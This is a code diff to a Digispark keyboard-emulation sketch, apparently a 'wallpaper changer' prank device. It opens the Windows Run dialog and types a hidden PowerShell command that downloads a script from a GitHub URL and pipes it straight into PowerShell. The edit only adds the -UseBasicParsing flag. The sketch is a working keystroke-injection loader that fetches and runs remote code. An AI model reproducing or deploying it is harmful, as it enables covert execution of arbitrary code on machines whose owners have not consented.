@@ -8,7 +8,7 @@ void setup() {
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(50);
-  DigiKeyboard.print("PowerShell.exe -windowstyle hidden $Response = Invoke-WebRequest https://raw.githubusercontent.com/vmorganp/digispark/master/wallpaper_changer/remote_script.ps1; echo $Response.Content | PowerShell.exe");
+  DigiKeyboard.print("PowerShell.exe -windowstyle hidden $Response = Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/vmorganp/digispark/master/wallpaper_changer/remote_script.ps1; echo $Response.Content | PowerShell.exe");
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
